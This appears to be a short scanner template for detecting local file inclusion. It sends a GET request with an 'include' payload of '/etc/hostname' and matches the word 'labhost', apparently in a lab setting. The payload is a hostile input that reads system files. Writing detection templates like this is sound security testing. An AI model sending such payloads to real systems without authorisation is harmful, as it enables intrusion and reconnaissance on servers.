id: lfi4-39
name: 'System file /etc/hostname via include'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads /etc/hostname via include'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      include:
        - '/etc/hostname'
    matchers:
      - type: word
        part: body
        words:
          - 'labhost'
